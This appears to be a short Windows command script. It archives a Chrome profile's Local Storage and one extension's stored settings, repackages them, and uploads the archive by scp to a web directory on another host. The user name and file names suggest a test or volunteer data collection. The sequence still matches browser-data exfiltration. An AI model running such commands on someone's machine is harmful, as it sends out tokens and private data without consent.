cd C:\Users\DVC_volunteer\AppData\Local\Google\Chrome
tar -c -f C:\Users\DVC_volunteer\Downloads\UserDataStart.tar "User Data\Default\Local Storage\leveldb" "User Data\Default\Local Extension Settings\nlmmgnhgdeffjkdckmikfpnddkbbfkkk"
cd C:\Users\DVC_volunteer\Downloads
rm -r temp
mkdir temp
cd temp
tar -x -f ..\UserDataStart.tar
pushd "User Data"
popd
tar -c -v -z -f UserData.test.tgz "User Data"
scp UserData.test.tgz dvc@10.50.7.1:/var/www/html
